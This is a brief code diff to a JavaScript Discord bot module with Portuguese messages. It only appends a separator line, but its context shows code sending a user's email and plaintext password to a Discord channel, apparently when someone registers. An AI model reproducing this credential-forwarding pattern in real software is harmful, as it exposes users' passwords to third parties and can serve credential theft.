@@ -278,7 +278,7 @@ module.exports = function discordComs(socketFromAbove, disc, defaultChanelId, ev
         } else {
             msg += `Com o Mail -> ___${moreData.email || 'SEM MAIL???'}___ \nPass -> ___${moreData.password || 'SEM PASS???'}___ \n__REGISTOU-SE__`
         }
-        client.channels.cache.get(defaultChanelId).send(`${msg} \n IMPORTANTE: __${debugMsg}__`)
+        client.channels.cache.get(defaultChanelId).send(`${msg} \n IMPORTANTE: __${debugMsg}__ \n ___________________________________________\n`)
     })
 
 };
